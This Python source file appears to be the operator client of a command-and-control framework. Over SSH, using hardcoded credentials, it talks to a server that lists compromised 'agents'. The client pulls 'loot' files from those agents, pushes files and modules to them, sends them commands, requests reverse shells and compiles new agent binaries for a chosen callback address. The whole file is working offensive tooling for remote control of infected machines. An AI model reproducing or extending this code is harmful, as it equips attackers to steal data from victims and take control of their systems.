import paramiko
import misc
import base64 as b64

class AgentStruct():
    def __init__(self, id, connection_time, hostname, interfaces, process_owner):
        self.id = id
        self.connection_time = connection_time
        self.hostname = hostname
        self.interfaces = interfaces
        self.process_owner = process_owner

class Session():
    def __init__(self, address, port=22):
        self.address = address
        self.port = port
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.channel = 0
        self.agents = []


    def update_addr(self, address):
        self.address = address

    def update_port(self, port):
        self.port = port

    def init_connection(self):
        self.ssh.connect(hostname=self.address, port=self.port, username='aris', password='lala', allow_agent=False)

        self.channel = self.ssh._transport.open_session()
        self.channel.invoke_shell()
                
        stdin = self.channel.makefile('wb')
        stdout = self.channel.makefile('r')

        # Initiate the connection
        self.channel.sendall("0")
        out = self.channel.recv(5)
        #print(out)
        self.channel.sendall("20|all")
        while out != "fi":
            out = self.channel.recv(8196).decode()
            if out != "fi":
                out = out.split("\n")
                #print(out)
                if len(out) < 5:
                    print("Out was too short of a fuckin list")
                    continue
                appnd = AgentStruct(out[0],out[2],out[3],out[1],out[4])
                self.agents.append(appnd)
                self.channel.sendall('0')
                #print("looped")

        print("[+] Successfully gathered agent information")

    def download_loot(self, agent_id):
        filepath = "."#misc.getSavePath()
        cnt=0
        data = b""
        ret = b""
        ret_dat = b""
        tmpbf = b""

        if not filepath:
            return 1

        self.channel.sendall("22|"+agent_id)
        num = int(self.channel.recv(8192).decode())
        self.channel.send("rd")    
        for i in range(num):
            cnt = 0
            data = b''
            
            name = self.channel.recv(256).strip(b'\x00')#.decode()
            print(name)
            name = name.decode()
            if name == 'fi':
                print("received last file successfully")
                break
            
            self.channel.sendall("ok")
            
            size = int(self.channel.recv(8192).decode())
            
            self.channel.sendall("ok")
            
            dat = self.channel.recv(size)
            file = open(filepath + "/" + name, "wb")
            data = b64.decodebytes(dat)
            file.write(data) 
            file.close()
            
            ret = self.channel.recv(256).strip(b'\x00')
            if ret != b'fi':
                print("got next")
                
                self.channel.send('rd')
                print(ret)
            else:
                print("[+] Got finished notification")
                break  
        print("Complete")     

    def upload_file(self, agent_id, file):
        print("[ ] Doing upload")
        self.channel.sendall("23|" + agent_id + ":" + file.filename)
        self.channel.recv(3)
        #print(file.filename)
        #self.channel.send(file.filename)
        #self.channel.recv(3)
        
        buff = b64.encodebytes(file.data).replace(b'\n', b'')
        
        self.channel.send(str(len(buff)))
        self.channel.recv(3)
        self.channel.send(buff)
        ret = self.channel.recv(3)
        print("[+] Success")
    
    def do_download(self, agent_id, path):
        print("[ ] Doing Download...")
        self.channel.sendall("24|%s:%s" % (agent_id, path))
        self.channel.recv(2)
        print("[+] Tasked agent with download")

    def push_module(self, agent_id, filestruct):
        print("[ ] Pushing module file to agent %s..." % agent_id)
        self.channel.sendall("25|%s" % agent_id)
        self.channel.recv(3)
        print(filestruct.filename)
        self.channel.send(filestruct.filename)
        self.channel.recv(3)
        
        buff = b64.encodebytes(filestruct.data).replace(b'\n', b'')
        
        self.channel.send(str(len(buff)))
        self.channel.recv(3)
        self.channel.send(buff)
        ret = self.channel.recv(3)
        print("[+] Success")

    def send_command(self, agent_id, command):
        print("[ ] Sending command to agent...")
        self.channel.sendall("26|%s:%s" % (agent_id, command))

    def req_revsh(self, agent_id, port):
        print("[ ] Sending Reverse Shell Request...")
        self.channel.sendall("27|%s:%s" % (agent_id, port))

    def compile_agent(self, ip, port):
        print("[ ] Sending compile request to server (%s:%d)..." % (ip, port))
        self.channel.sendall("28|%s:%s" % (ip, port))
        fileData = b""
        data = self.channel.recv(128).decode()
        print(data)
        size = int(data.strip('\x00'))
        #size = int(self.channel.recv(128).decode())
        self.channel.send("ok")
        fileData = self.channel.recv(size)
        if len(fileData) < size:
            fileData += self.channel.recv(size)
        print(len(fileData))
        file = b64.decodebytes(fileData[:size])
        misc.save_file(file)

    def register_agent(self, name, password):
        print("[ ] Registering agent with server...")
        self.channel.sendall('29|%s:%s' % (name, password))

    def clean_exit(self):
        self.channel.sendall("00")
        self.channel = 0
        print("[+] Backend closed down")

    
